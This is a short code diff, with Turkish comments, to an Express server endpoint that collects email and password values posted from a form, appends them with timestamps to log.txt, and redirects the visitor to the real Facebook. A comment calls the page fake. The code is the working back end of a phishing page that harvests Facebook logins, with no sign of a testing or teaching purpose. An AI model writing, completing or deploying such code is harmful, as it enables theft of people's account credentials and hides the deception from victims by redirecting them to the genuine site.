@@ -7,9 +7,12 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 app.post("/log", (req, res) => {
   const { email, password } = req.body;
-  const log = `E-posta: ${email}, Şifre: ${password}, Tarih: ${new Date()}\n`;
-  fs.appendFileSync("log.txt", log);
-  res.redirect("https://facebook.com"); // Gerçek siteye yönlendir
+
+  // 👇 Bu satırı buraya koy
+  const log = `Email: ${email}, Şifre: ${password}, Tarih: ${new Date().toLocaleString()}\n`;
+fs.appendFileSync("log.txt", log);
+ // log.txt dosyasına yaz
+  res.redirect("https://facebook.com"); // sahte sayfadan sonra gerçek Facebook'a yönlendir
 });
 
 app.listen(3000, () => {
